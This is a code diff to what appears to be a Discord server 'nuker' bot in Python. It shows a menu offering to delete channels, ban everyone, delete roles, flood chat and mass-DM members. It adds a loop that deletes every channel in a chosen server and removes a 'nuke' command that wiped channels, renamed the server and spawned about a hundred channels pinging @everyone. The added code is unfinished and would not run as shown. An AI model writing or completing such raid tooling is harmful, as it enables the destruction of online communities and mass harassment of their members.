@@ -22,25 +22,22 @@ f.close()
 
 print(color.RESET + "[1] Delete channels | [2] Create channels | [3] Alert message\n[4] Ban everyone | [5] Delete roles | [6] Create roles\n[7] Flood chat | [8] Change nicknames | [9] Mass DM".center(24))
 
+choice = input("Choice: ")
+if choice == "1":
+  id = input("Guild ID: ")
+  for guild in bot.guilds:
+    if guild.id == int(id):
+      for channel in guild.channels:
+        try:
+          n = channel.name
+          await channel.delete()
+          print(color.GREEN + f"[~] Deleted {n}")
+        except:
+          print(color.RED + f"[!] Error deleting {channel.name}")
+elif choice == "2":
 
 
 
-@bot.command()
-@commands.guild_only()
-async def nuke(ctx, *, arg):
-    if ctx.author.id == ID:
-        for channel in ctx.guild.channels:
-            try:
-                await channel.delete()
-            except:
-                print(color.RED + f"[!] Error deleting {channel.name}")
-        await ctx.guild.edit(name=arg)
-        x = 100
-        while x >= 0:
-            ch = await ctx.guild.create_text_channel(arg)
-            await ch.send(f"{arg} | @everyone")
-            x = int(x) -1
-        print(color.GREEN + f"[~] Nuked {ctx.guild.name}")
 
 @bot.command()
 @commands.guild_only()
